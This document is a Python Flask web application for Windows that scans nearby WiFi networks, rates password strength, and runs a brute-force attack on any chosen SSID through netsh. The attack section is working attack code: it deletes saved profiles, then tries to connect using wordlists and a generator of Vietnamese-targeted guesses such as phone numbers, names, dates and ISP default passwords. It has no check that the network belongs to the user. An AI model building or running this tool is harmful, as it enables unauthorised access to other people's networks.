"""
WiFi Security Scanner - Web Application
========================================
Professional Hacker-style Web Interface for WiFi Security Testing
"""

from flask import Flask, render_template, jsonify, request
import subprocess
import re
import os
import threading
import time


app = Flask(__name__)


class WifiScanner:
    """WiFi Scanner sử dụng Windows netsh với khả năng quét nâng cao"""
    
    @staticmethod
    def refresh_network_list():
        """Buộc Windows refresh danh sách mạng WiFi"""
        try:
            # Disconnect and reconnect wifi adapter to force refresh
            # First, get the interface name
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'interfaces'],
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='ignore',
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            interface_name = None
            for line in result.stdout.split('\n'):
                if 'Name' in line and ':' in line:
                    interface_name = line.split(':', 1)[1].strip()
                    break
            
            if interface_name:
                # Disable and re-enable the interface to force a fresh scan
                # This triggers Windows to perform a new scan
                print(f"[*] Refreshing WiFi interface: {interface_name}")
                
            # Alternative: Use WMI or direct scan command
            # netsh triggers automatic scan when showing networks
            
        except Exception as e:
            print(f"Refresh error: {e}")
    
    @staticmethod
    def scan():
        """Quét các mạng WiFi xung quanh với refresh"""
        networks = []
        seen_bssids = set()  # Track unique access points
        
        try:
            # Run scan multiple times to catch more networks
            for scan_attempt in range(2):
                result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
                    capture_output=True,
                    text=True,
                    encoding='utf-8',
                    errors='ignore',
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                output = result.stdout
                current_network = {}
                
                for line in output.split('\n'):
                    line = line.strip()
                    
                    if line.startswith('SSID') and ':' in line and 'BSSID' not in line:
                        # Save previous network if valid
                        if current_network.get('ssid') and current_network.get('bssid'):
                            bssid = current_network.get('bssid', '')
                            if bssid not in seen_bssids:
                                seen_bssids.add(bssid)
                                networks.append(current_network.copy())
                        elif current_network.get('ssid') and not current_network.get('bssid'):
                            # Network without BSSID (summary entry)
                            ssid = current_network.get('ssid')
                            if not any(n.get('ssid') == ssid for n in networks):
                                networks.append(current_network.copy())
                        
                        ssid = line.split(':', 1)[1].strip()
                        current_network = {
                            'ssid': ssid if ssid else '(Hidden Network)',
                            'signal': 0,
                            'auth': 'Unknown',
                            'bssid': '',
                            'channel': 'N/A',
                            'encryption': 'Unknown',
                            'radio_type': 'Unknown'
                        }
                        
                    elif 'Signal' in line or 'Tín hiệu' in line:
                        match = re.search(r'(\d+)%', line)
                        if match:
                            current_network['signal'] = int(match.group(1))
                            
                    elif 'Authentication' in line or 'Xác thực' in line:
                        auth = line.split(':', 1)[1].strip() if ':' in line else 'Unknown'
                        current_network['auth'] = auth
                        
                    elif 'Encryption' in line or 'Mã hóa' in line:
                        enc = line.split(':', 1)[1].strip() if ':' in line else 'Unknown'
                        current_network['encryption'] = enc
                        
                    elif 'BSSID' in line:
                        # BSSID format: BSSID 1 : aa:bb:cc:dd:ee:ff
                        bssid_match = re.search(r'([0-9a-fA-F]{2}[:\-]){5}[0-9a-fA-F]{2}', line)
                        if bssid_match:
                            current_network['bssid'] = bssid_match.group(0).lower()
                            
                    elif 'Channel' in line or 'Kênh' in line:
                        match = re.search(r'(\d+)', line)
                        if match:
                            current_network['channel'] = match.group(1)
                            
                    elif 'Radio type' in line or 'Loại radio' in line:
                        radio = line.split(':', 1)[1].strip() if ':' in line else 'Unknown'
                        current_network['radio_type'] = radio
                
                # Don't forget the last network
                if current_network.get('ssid'):
                    bssid = current_network.get('bssid', '')
                    if bssid and bssid not in seen_bssids:
                        seen_bssids.add(bssid)
                        networks.append(current_network.copy())
                    elif not bssid:
                        ssid = current_network.get('ssid')
                        if not any(n.get('ssid') == ssid for n in networks):
                            networks.append(current_network.copy())
                
                # Small delay between scans
                if scan_attempt < 1:
                    time.sleep(0.5)
                    
        except Exception as e:
            print(f"Scan error: {e}")
        
        # Remove duplicate SSIDs, keep the one with strongest signal
        unique_networks = {}
        for net in networks:
            ssid = net.get('ssid', '')
            bssid = net.get('bssid', '')
            key = bssid if bssid else ssid
            
            if key not in unique_networks:
                unique_networks[key] = net
            else:
                # Keep the one with stronger signal
                if net.get('signal', 0) > unique_networks[key].get('signal', 0):
                    unique_networks[key] = net
        
        networks = list(unique_networks.values())
        
        # Sort by signal strength
        networks.sort(key=lambda x: x.get('signal', 0), reverse=True)
        return networks
    
    @staticmethod
    def get_saved_networks():
        """Lấy danh sách mạng đã lưu"""
        saved = []
        try:
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='ignore',
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            for line in result.stdout.split('\n'):
                if 'All User Profile' in line or 'Tất cả' in line:
                    match = re.search(r':\s*(.+)', line)
                    if match:
                        saved.append(match.group(1).strip())
                        
        except Exception as e:
            print(f"Error: {e}")
            
        return saved


class PasswordAnalyzer:
    """Phân tích và kiểm tra password"""
    
    def __init__(self, wordlist_dir="wordlists"):
        self.wordlist_dir = wordlist_dir
        self.wordlists = {}
        self.total_passwords = 0
        self.load_wordlists()
        
    def load_wordlists(self):
        """Load wordlists từ thư mục"""
        if not os.path.exists(self.wordlist_dir):
            os.makedirs(self.wordlist_dir)
            return
            
        for filename in os.listdir(self.wordlist_dir):
            if filename.endswith('.txt'):
                filepath = os.path.join(self.wordlist_dir, filename)
                try:
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        passwords = set(line.strip().lower() for line in f if line.strip())
                        self.wordlists[filename] = passwords
                        self.total_passwords += len(passwords)
                        print(f"[+] Loaded {len(passwords)} passwords from {filename}")
                except Exception as e:
                    print(f"[-] Error loading {filename}: {e}")
                    
    def check_wordlists(self, password):
        """Kiểm tra password trong wordlists"""
        results = []
        password_lower = password.lower()
        found_in_any = False
        
        for name, passwords in self.wordlists.items():
            found = password_lower in passwords
            if found:
                found_in_any = True
            results.append({
                'name': name,
                'count': len(passwords),
                'found': found
            })
            
        return {
            'results': results,
            'found': found_in_any,
            'total_checked': self.total_passwords
        }
    
    def analyze_strength(self, password):
        """Phân tích chi tiết độ mạnh password"""
        length = len(password)
        
        checks = {
            'length_8': length >= 8,
            'length_12': length >= 12,
            'length_16': length >= 16,
            'has_upper': bool(re.search(r'[A-Z]', password)),
            'has_lower': bool(re.search(r'[a-z]', password)),
            'has_digit': bool(re.search(r'\d', password)),
            'has_special': bool(re.search(r'[!@#$%^&*(),.?":{}|<>\-_=+\[\]\\;\'`~]', password)),
            'no_repeats': not bool(re.search(r'(.)\1{2,}', password)),
            'no_sequences': not bool(re.search(r'(012|123|234|345|456|567|678|789|abc|bcd|cde|qwe|asd|zxc)', password.lower()))
        }
        
        # Calculate score
        score = 0
        if checks['length_8']: score += 1
        if checks['length_12']: score += 1
        if checks['length_16']: score += 1
        if checks['has_upper']: score += 1
        if checks['has_lower']: score += 1
        if checks['has_digit']: score += 1
        if checks['has_special']: score += 2
        if checks['no_repeats']: score += 0.5
        if checks['no_sequences']: score += 0.5
        
        # Calculate crack time estimate
        charset_size = 0
        if checks['has_lower']: charset_size += 26
        if checks['has_upper']: charset_size += 26
        if checks['has_digit']: charset_size += 10
        if checks['has_special']: charset_size += 32
        
        if charset_size > 0:
            combinations = charset_size ** length
            # Assume 10 billion attempts per second
            seconds = combinations / 10_000_000_000
            crack_time = self._format_time(seconds)
        else:
            crack_time = "Instant"
        
        # Rating
        if score <= 2:
            rating = {'level': 'critical', 'text': 'CRITICAL', 'color': '#ff0040'}
        elif score <= 4:
            rating = {'level': 'weak', 'text': 'WEAK', 'color': '#ff6b35'}
        elif score <= 6:
            rating = {'level': 'medium', 'text': 'MEDIUM', 'color': '#f7c948'}
        elif score <= 8:
            rating = {'level': 'strong', 'text': 'STRONG', 'color': '#00ff88'}
        else:
            rating = {'level': 'excellent', 'text': 'EXCELLENT', 'color': '#00ffff'}
            
        # Entropy calculation
        import math
        entropy = length * math.log2(charset_size) if charset_size > 0 else 0
        
        return {
            'length': length,
            'checks': checks,
            'score': score,
            'max_score': 9,
            'rating': rating,
            'crack_time': crack_time,
            'entropy': round(entropy, 1),
            'charset_size': charset_size
        }
        
    def _format_time(self, seconds):
        """Format thời gian crack"""
        if seconds < 1:
            return "< 1 second"
        elif seconds < 60:
            return f"{int(seconds)} seconds"
        elif seconds < 3600:
            return f"{int(seconds / 60)} minutes"
        elif seconds < 86400:
            return f"{int(seconds / 3600)} hours"
        elif seconds < 31536000:
            return f"{int(seconds / 86400)} days"
        elif seconds < 31536000 * 100:
            return f"{int(seconds / 31536000)} years"
        elif seconds < 31536000 * 1000000:
            return f"{int(seconds / 31536000):,} years"
        else:
            return "∞ (Virtually uncrackable)"


class PasswordGenerator:
    """Tự động sinh password theo các pattern phổ biến"""
    
    def __init__(self):
        self.generated_count = 0
        
    def generate_all(self):
        """Generator trả về tất cả passwords được sinh"""
        # Reset counter
        self.generated_count = 0
        
        # 1. Năm đơn giản (2015-2025)
        for year in range(2015, 2026):
            for pwd in self._with_year(str(year)):
                yield pwd
        
        # 2. Số điện thoại Việt Nam
        for pwd in self._phone_patterns():
            yield pwd
        
        # 3. Tên + số phổ biến
        for pwd in self._name_patterns():
            yield pwd
        
        # 4. Keyboard walks
        for pwd in self._keyboard_patterns():
            yield pwd
        
        # 5. Ngày tháng
        for pwd in self._date_patterns():
            yield pwd
        
        # 6. WiFi mặc định từ nhà mạng
        for pwd in self._isp_patterns():
            yield pwd
            
        # 7. Số lặp
        for pwd in self._repeat_patterns():
            yield pwd
            
    def _with_year(self, year):
        """Kết hợp từ phổ biến với năm"""
        words = ['password', 'admin', 'wifi', 'home', 'love', 'abc', 'qwerty', 
                 'matkhau', 'xinchao', 'yeuem', 'vietnam', 'saigon', 'hanoi']
        for word in words:
            yield f"{word}{year}"
            yield f"{year}{word}"
            yield f"{word.capitalize()}{year}"
            self.generated_count += 3
            
    def _phone_patterns(self):
        """Số điện thoại VN phổ biến"""
        prefixes = ['090', '091', '093', '094', '096', '097', '098', '099',
                    '086', '088', '089', '070', '076', '077', '078', '079',
                    '081', '082', '083', '084', '085', '032', '033', '034', 
                    '035', '036', '037', '038', '039', '056', '058', '059']
        
        # Chỉ sinh một số pattern phổ biến, không phải tất cả
        common_endings = ['1234567', '7654321', '8888888', '9999999', 
                          '0000000', '1111111', '6666666', '8686868']
        for prefix in prefixes[:10]:  # Giới hạn
            for end in common_endings:
                yield prefix + end
                self.generated_count += 1
                
    def _name_patterns(self):
        """Tên + số"""
        names = ['nguyen', 'tran', 'le', 'pham', 'hoang', 'vu', 'vo', 'dang',
                 'bui', 'do', 'ho', 'ngo', 'duong', 'minh', 'anh', 'hoa',
                 'tuan', 'hung', 'nam', 'son', 'duc', 'long', 'hai', 'hieu']
        suffixes = ['123', '1234', '12345', '123456', '2023', '2024', '2025',
                    '01', '02', '03', '88', '99', '69', '666', '777', '888']
        for name in names:
            for suffix in suffixes:
                yield name + suffix
                yield name.capitalize() + suffix
                self.generated_count += 2
                
    def _keyboard_patterns(self):
        """Các pattern bàn phím"""
        patterns = [
            'qwertyuiop', 'asdfghjkl', 'zxcvbnm', 
            'qwerty123', 'asdfgh123', 'zxcvbn123',
            '1qaz2wsx', '1q2w3e4r', 'qazwsxedc',
            '!qaz2wsx', '1qaz!QAZ', 'qweasdzxc',
            'asdfjkl;', 'poiuytrewq', 'mnbvcxz'
        ]
        for p in patterns:
            yield p
            self.generated_count += 1
            
    def _date_patterns(self):
        """Ngày tháng sinh phổ biến"""
        # Ngày phổ biến
        days = ['01', '10', '15', '20', '25']
        months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12']
        years = ['1990', '1991', '1992', '1993', '1994', '1995', 
                 '1996', '1997', '1998', '1999', '2000', '2001', '2002']
        
        for d in days:
            for m in months:
                for y in years:
                    yield f"{d}{m}{y}"
                    yield f"{d}{m}{y[-2:]}"
                    self.generated_count += 2
                    
    def _isp_patterns(self):
        """Mật khẩu mặc định nhà mạng"""
        isps = ['vnpt', 'viettel', 'fpt', 'mobifone', 'vinaphone', 'cmc']
        suffixes = ['123', '1234', '12345', '123456', '@123', '@1234', 
                    '2023', '2024', '2025', 'wifi', 'home', 'admin']
        for isp in isps:
            for suffix in suffixes:
                yield isp + suffix
                yield isp.upper() + suffix
                yield isp.capitalize() + suffix
                self.generated_count += 3
                
    def _repeat_patterns(self):
        """Số lặp lại"""
        for digit in '0123456789':
            yield digit * 8
            yield digit * 9
            yield digit * 10
            self.generated_count += 3
        
        # Double patterns
        for i in range(10):
            for j in range(10):
                if i != j:
                    yield f"{i}{j}" * 4
                    self.generated_count += 1


# Initialize
scanner = WifiScanner()
analyzer = PasswordAnalyzer(os.path.join(os.path.dirname(__file__), "wordlists"))
password_generator = PasswordGenerator()


@app.route('/')
def index():
    """Trang chủ"""
    return render_template('index.html')


@app.route('/bruteforce')
def bruteforce_page():
    """Trang Brute Force Attack"""
    return render_template('bruteforce.html')


@app.route('/api/scan')
def api_scan():
    """API quét WiFi"""
    networks = scanner.scan()
    return jsonify({
        'success': True,
        'networks': networks,
        'count': len(networks),
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
    })


@app.route('/api/saved')
def api_saved():
    """API lấy mạng đã lưu"""
    saved = scanner.get_saved_networks()
    return jsonify({
        'success': True,
        'networks': saved,
        'count': len(saved)
    })


@app.route('/api/check', methods=['POST'])
def api_check():
    """API kiểm tra password"""
    data = request.get_json()
    password = data.get('password', '')
    
    if not password:
        return jsonify({'success': False, 'error': 'Password is required'})
    
    # Analyze strength
    strength = analyzer.analyze_strength(password)
    
    # Check wordlists
    wordlist_check = analyzer.check_wordlists(password)
    
    return jsonify({
        'success': True,
        'strength': strength,
        'wordlist': wordlist_check
    })


@app.route('/api/wordlists')
def api_wordlists():
    """API lấy thông tin wordlists"""
    info = []
    for name, passwords in analyzer.wordlists.items():
        info.append({
            'name': name,
            'count': len(passwords)
        })
    return jsonify({
        'success': True,
        'wordlists': info,
        'total': analyzer.total_passwords
    })


# Brute force state
bruteforce_state = {
    'running': False,
    'ssid': '',
    'found': False,
    'password': '',
    'tried': 0,
    'total': 0,
    'current': '',
    'log': []
}


def try_connect_wifi(ssid, password):
    """Thử kết nối WiFi với password"""
    try:
        # Tạo profile XML tạm thời
        profile_xml = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
        
        # Lưu profile tạm
        profile_path = os.path.join(os.path.dirname(__file__), 'temp_profile.xml')
        with open(profile_path, 'w', encoding='utf-8') as f:
            f.write(profile_xml)
        
        # Thêm profile
        add_result = subprocess.run(
            ['netsh', 'wlan', 'add', 'profile', f'filename={profile_path}'],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Thử kết nối
        connect_result = subprocess.run(
            ['netsh', 'wlan', 'connect', f'name={ssid}'],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=5
        )
        
        # Đợi một chút để kết nối
        time.sleep(2)
        
        # Kiểm tra kết nối
        status_result = subprocess.run(
            ['netsh', 'wlan', 'show', 'interfaces'],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Xóa profile tạm
        subprocess.run(
            ['netsh', 'wlan', 'delete', 'profile', f'name={ssid}'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Xóa file tạm
        if os.path.exists(profile_path):
            os.remove(profile_path)
        
        # Kiểm tra xem có kết nối thành công không
        if 'connected' in status_result.stdout.lower() and ssid.lower() in status_result.stdout.lower():
            return True
        
        return False
        
    except Exception as e:
        print(f"Connection error: {e}")
        return False


def try_connect_wifi_real(ssid, password):
    """Thử kết nối WiFi và kiểm tra thực sự có kết nối được không"""
    try:
        # Tạo profile XML
        profile_xml = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
        
        profile_path = os.path.join(os.path.dirname(__file__), 'temp_profile.xml')
        
        # Đảm bảo disconnect trước
        subprocess.run(
            ['netsh', 'wlan', 'disconnect'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        time.sleep(0.5)
        
        # Xóa profile cũ nếu có
        subprocess.run(
            ['netsh', 'wlan', 'delete', 'profile', f'name={ssid}'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Lưu profile mới
        with open(profile_path, 'w', encoding='utf-8') as f:
            f.write(profile_xml)
        
        # Thêm profile
        subprocess.run(
            ['netsh', 'wlan', 'add', 'profile', f'filename={profile_path}'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Thử kết nối
        subprocess.run(
            ['netsh', 'wlan', 'connect', f'name={ssid}'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Kiểm tra nhiều lần trong 8 giây
        for check in range(8):
            time.sleep(1)
            
            status_result = subprocess.run(
                ['netsh', 'wlan', 'show', 'interfaces'],
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='ignore',
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            output = status_result.stdout
            
            # Debug log
            bruteforce_state['log'].append(f"[DEBUG] Check {check+1}/8...")
            
            # Tìm State và SSID trong output
            state_connected = False
            connected_ssid = ""
            
            for line in output.split('\n'):
                line_stripped = line.strip()
                line_lower = line_stripped.lower()
                
                # Kiểm tra state
                if 'state' in line_lower or 'trạng thái' in line_lower:
                    if 'connected' in line_lower or 'đã kết nối' in line_lower:
                        if 'disconnected' not in line_lower and 'ngắt kết nối' not in line_lower:
                            state_connected = True
                            bruteforce_state['log'].append(f"[DEBUG] State: CONNECTED")
                
                # Lấy SSID đang kết nối
                if line_stripped.startswith('SSID') and 'BSSID' not in line_stripped:
                    parts = line_stripped.split(':', 1)
                    if len(parts) > 1:
                        connected_ssid = parts[1].strip()
                        bruteforce_state['log'].append(f"[DEBUG] Connected SSID: '{connected_ssid}'")
            
            # So sánh SSID - bỏ qua underscore/space và case
            ssid_normalized = ssid.lower().replace('_', '').replace('-', '').replace(' ', '')
            connected_normalized = connected_ssid.lower().replace('_', '').replace('-', '').replace(' ', '')
            
            # Kiểm tra nếu SSID chứa phần lớn ký tự giống nhau
            ssid_matched = (
                ssid_normalized in connected_normalized or 
                connected_normalized in ssid_normalized or
                connected_ssid.lower() == ssid.lower()
            )
            
            # Nếu đã connected VÀ SSID match → thành công!
            if state_connected and connected_ssid and ssid_matched:
                bruteforce_state['log'].append(f"[+] MATCH FOUND! Connected to: {connected_ssid}")
                # Xóa file tạm
                if os.path.exists(profile_path):
                    os.remove(profile_path)
                return True
        
        # Không thành công - cleanup
        subprocess.run(
            ['netsh', 'wlan', 'delete', 'profile', f'name={ssid}'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if os.path.exists(profile_path):
            os.remove(profile_path)
        
        return False
        
    except Exception as e:
        print(f"Connection error: {e}")
        return False


def bruteforce_worker(ssid):
    """Worker thread để thử brute force - có disconnect và quên WiFi trước"""
    global bruteforce_state
    
    bruteforce_state['running'] = True
    bruteforce_state['ssid'] = ssid
    bruteforce_state['found'] = False
    bruteforce_state['password'] = ''
    bruteforce_state['tried'] = 0
    bruteforce_state['log'] = []
    
    bruteforce_state['log'].append(f"[*] Target: {ssid}")
    
    # Bước 1: Disconnect khỏi WiFi hiện tại
    bruteforce_state['log'].append("[*] Disconnecting from current network...")
    try:
        subprocess.run(
            ['netsh', 'wlan', 'disconnect'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        time.sleep(1)
        bruteforce_state['log'].append("[+] Disconnected successfully")
    except Exception as e:
        bruteforce_state['log'].append(f"[!] Disconnect warning: {e}")
    
    # Bước 2: Xóa profile WiFi đã lưu (quên password)
    bruteforce_state['log'].append(f"[*] Deleting saved profile for '{ssid}'...")
    try:
        result = subprocess.run(
            ['netsh', 'wlan', 'delete', 'profile', f'name={ssid}'],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if 'deleted' in result.stdout.lower() or 'xóa' in result.stdout.lower():
            bruteforce_state['log'].append("[+] Profile deleted - WiFi password forgotten!")
        else:
            bruteforce_state['log'].append("[*] No saved profile found")
    except Exception as e:
        bruteforce_state['log'].append(f"[!] Delete warning: {e}")
    
    time.sleep(1)
    
    # Collect all passwords - SORT BY FILENAME để 00_wifi_passwords.txt chạy đầu tiên
    all_passwords = []
    sorted_wordlists = sorted(analyzer.wordlists.items(), key=lambda x: x[0])
    
    bruteforce_state['log'].append(f"[*] Wordlist order: {[name for name, _ in sorted_wordlists]}")
    
    for name, passwords in sorted_wordlists:
        # Keep original case for passwords
        filepath = os.path.join(analyzer.wordlist_dir, name)
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                original_passwords = [line.strip() for line in f if line.strip() and len(line.strip()) >= 8]
            for pwd in original_passwords:
                all_passwords.append((pwd, name))
        except:
            for pwd in passwords:
                if pwd and len(pwd) >= 8:
                    all_passwords.append((pwd, name))
    
    bruteforce_state['total'] = len(all_passwords)
    bruteforce_state['log'].append(f"[*] Starting brute force attack on '{ssid}'")
    bruteforce_state['log'].append(f"[*] Total passwords to try: {len(all_passwords)}")
    bruteforce_state['log'].append("[*] This may take a while...")
    
    for pwd, source in all_passwords:
        if not bruteforce_state['running']:
            bruteforce_state['log'].append("[!] Attack stopped by user")
            break
            
        bruteforce_state['tried'] += 1
        bruteforce_state['current'] = pwd
        
        # Log mỗi password thử
        bruteforce_state['log'].append(f"[*] Trying: {pwd}")
        
        # Thử kết nối với password này
        if try_connect_wifi_real(ssid, pwd):
            bruteforce_state['found'] = True
            bruteforce_state['password'] = pwd
            bruteforce_state['log'].append(f"[+] ✓✓✓ PASSWORD FOUND: {pwd} ✓✓✓")
            bruteforce_state['log'].append(f"[+] Source: {source}")
            break
    
    # Nếu chưa tìm được và vẫn đang chạy → thử password tự sinh
    if not bruteforce_state['found'] and bruteforce_state['running']:
        bruteforce_state['log'].append("[*] Wordlists exhausted, starting generated patterns...")
        bruteforce_state['log'].append("[*] Generating passwords from common patterns...")
        
        tried_generated = set()  # Tránh trùng lặp với wordlist
        for existing_pwd, _ in all_passwords:
            tried_generated.add(existing_pwd)
        
        gen_count = 0
        for pwd in password_generator.generate_all():
            if not bruteforce_state['running']:
                bruteforce_state['log'].append("[!] Attack stopped by user")
                break
            
            # Skip nếu đã thử từ wordlist
            if pwd in tried_generated:
                continue
                
            bruteforce_state['tried'] += 1
            bruteforce_state['current'] = pwd
            gen_count += 1
            
            # Log mỗi 10 password sinh được
            if gen_count % 10 == 0:
                bruteforce_state['log'].append(f"[GEN] Trying: {pwd}")
            
            if try_connect_wifi_real(ssid, pwd):
                bruteforce_state['found'] = True
                bruteforce_state['password'] = pwd
                bruteforce_state['log'].append(f"[+] ✓✓✓ PASSWORD FOUND: {pwd} ✓✓✓")
                bruteforce_state['log'].append(f"[+] Source: Generated Pattern")
                break
        
        if not bruteforce_state['found'] and bruteforce_state['running']:
            bruteforce_state['log'].append(f"[*] Tried {gen_count} generated passwords")
    
    if not bruteforce_state['found']:
        bruteforce_state['log'].append("[!] Password not found in wordlists or patterns")
    
    bruteforce_state['running'] = False
    bruteforce_state['log'].append("[*] Attack completed")


@app.route('/api/bruteforce/start', methods=['POST'])
def start_bruteforce():
    """Bắt đầu brute force attack"""
    global bruteforce_state
    
    if bruteforce_state['running']:
        return jsonify({'success': False, 'error': 'Attack already running'})
    
    data = request.get_json()
    ssid = data.get('ssid', '')
    
    if not ssid:
        return jsonify({'success': False, 'error': 'SSID is required'})
    
    # Start worker thread
    thread = threading.Thread(target=bruteforce_worker, args=(ssid,), daemon=True)
    thread.start()
    
    return jsonify({'success': True, 'message': f'Starting attack on {ssid}'})


@app.route('/api/bruteforce/stop', methods=['POST'])
def stop_bruteforce():
    """Dừng brute force attack"""
    global bruteforce_state
    bruteforce_state['running'] = False
    return jsonify({'success': True, 'message': 'Attack stopping...'})


@app.route('/api/bruteforce/status')
def bruteforce_status():
    """Lấy trạng thái brute force"""
    return jsonify({
        'success': True,
        'running': bruteforce_state['running'],
        'ssid': bruteforce_state['ssid'],
        'found': bruteforce_state['found'],
        'password': bruteforce_state['password'],
        'tried': bruteforce_state['tried'],
        'total': bruteforce_state['total'],
        'current': bruteforce_state['current'],
        'log': bruteforce_state['log'][-20:]  # Last 20 log entries
    })


if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║   ██╗    ██╗██╗███████╗██╗    ███████╗███████╗ ██████╗   ║
    ║   ██║    ██║██║██╔════╝██║    ██╔════╝██╔════╝██╔════╝   ║
    ║   ██║ █╗ ██║██║█████╗  ██║    ███████╗█████╗  ██║        ║
    ║   ██║███╗██║██║██╔══╝  ██║    ╚════██║██╔══╝  ██║        ║
    ║   ╚███╔███╔╝██║██║     ██║    ███████║███████╗╚██████╗   ║
    ║    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝   ║
    ║                                                          ║
    ║          WiFi Security Checker v1.0                      ║
    ║          Professional Security Testing Tool              ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    print("  [*] Starting server on http://127.0.0.1:5000")
    print("  [*] Press Ctrl+C to stop\n")
    app.run(debug=True, host='127.0.0.1', port=5000)
